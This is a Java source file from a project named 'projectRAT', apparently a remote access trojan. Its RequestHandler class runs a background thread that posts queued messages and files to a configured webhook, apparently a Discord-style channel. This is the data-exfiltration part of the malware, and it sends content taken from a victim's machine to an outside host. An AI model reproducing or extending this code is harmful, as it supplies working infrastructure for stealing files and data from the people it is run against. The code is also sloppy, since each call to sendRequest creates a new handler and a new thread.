package in.momin5.projectRAT;

import in.momin5.projectRAT.request.Request;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.entity.EntityBuilder;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.File;
import java.util.ArrayDeque;
import java.util.Queue;

public class RequestHandler {

    private final Queue<Request> queue = new ArrayDeque<>();

    public RequestHandler()  {

        new Thread(() -> {
            while (true) {
                try {
                    if(queue.isEmpty()) continue;
                    Thread.sleep(2000);
                    Request item = queue.poll();

                    CloseableHttpClient client = HttpClientBuilder.create().build();
                    // TODO: @Momin maybe embeds?
                    if(item.getMessage() != null) {
                        HttpPost request = new HttpPost(ProjectRAT.webhook);
                        JSONObject json = new JSONObject();

                        /*JSONArray embeds = new JSONArray();
                        JSONObject embed = new JSONObject();
                        JSONArray field = new JSONArray();
                        JSONObject x = new JSONObject();
                        x.put("name",item.getClass().getSimpleName());
                        x.put("value",item.getMessage());
                        field.add(x);
                        embed.put("fields",field);
                        embeds.add(embed);
                        json.put("embeds",embeds);*/

                        json.put("title",item.getClass().getSimpleName());
                        json.put("content",String.format("```%s```",item.getMessage()));
                        StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
                        request.setEntity(options);
                        HttpResponse response = client.execute(request);
                        System.out.println(response);
                    }

                    if(item.getFiles() != null){
                        for(File file: item.getFiles()){
                            HttpPost request = new HttpPost(ProjectRAT.webhook);

                            MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder
                                    .create()
                                    .addPart("_mom_i5n_", new FileBody(file));

                            request.setEntity(multipartEntityBuilder.build());
                            HttpResponse response = client.execute(request);
                            System.out.println(response);
                        }
                    }
                    client.close();

                }catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sendRequest(Request request) {
        new RequestHandler().queue.add(request);
    }

}
